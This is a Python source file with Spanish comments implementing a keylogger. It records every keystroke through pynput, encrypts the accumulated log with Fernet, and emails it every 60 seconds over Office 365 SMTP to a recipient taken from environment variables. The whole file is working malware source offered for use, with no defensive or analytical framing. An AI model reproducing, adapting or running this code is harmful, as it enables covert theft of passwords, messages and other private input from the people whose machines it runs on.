"""
Keylogger para capturar teclas, cifrar los datos y enviarlos por correo electrónico.
"""

import os
import smtplib
import threading

from cryptography.fernet import Fernet
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()


class Keylogger:
    """
    Clase para capturar teclas, cifrar los datos y enviarlos por correo electrónico.
    """

    def __init__(self, email: str, password: str, recipient: str):
        """
        Inicializa el keylogger con las credenciales de correo y destinatario.

        :param email: Dirección de correo del remitente
        :param password: Contraseña del correo del remitente
        :param recipient: Dirección de correo del destinatario
        """
        self.log = ""
        self.email = email
        self.password = password
        self.recipient = recipient
        self.key = self.load_key()
        self.cipher_suite = Fernet(self.key)

    def load_key(self) -> bytes:
        """
        Carga la clave de cifrado desde un archivo.

        :return: Clave de cifrado en bytes
        """
        return open(os.environ.get("passfile"), 'rb').read()

    def on_press(self, key: keyboard.Key):
        """
        Callback para manejar la captura de teclas.

        :param key: Tecla presionada
        """
        try:
            if key.char is not None:
                self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f" {str(key)} "

    def encrypt_log(self) -> bytes:
        """
        Cifra el log de teclas capturadas.

        :return: Log cifrado en bytes
        """
        return self.cipher_suite.encrypt(self.log.encode())

    def send_mail(self):
        """
        Envía el log cifrado por correo electrónico cada 60 segundos.
        """
        if self.log:
            try:
                encrypted_log = self.encrypt_log()
                print("Encrypted log:", encrypted_log)  # Imprimir el log cifrado
                server = smtplib.SMTP('smtp.office365.com', 587)
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.recipient, encrypted_log)
                server.quit()
            except smtplib.SMTPException as e:
                print(f"Error al enviar correo: {e}")
            self.log = ""
        threading.Timer(60, self.send_mail).start()

    def start(self):
        """
        Inicia el keylogger y el envío periódico de correos electrónicos.
        """
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.send_mail()
        listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(os.environ.get("email"), os.environ.get("password"), os.environ.get("receptor"))
    keylogger.start()
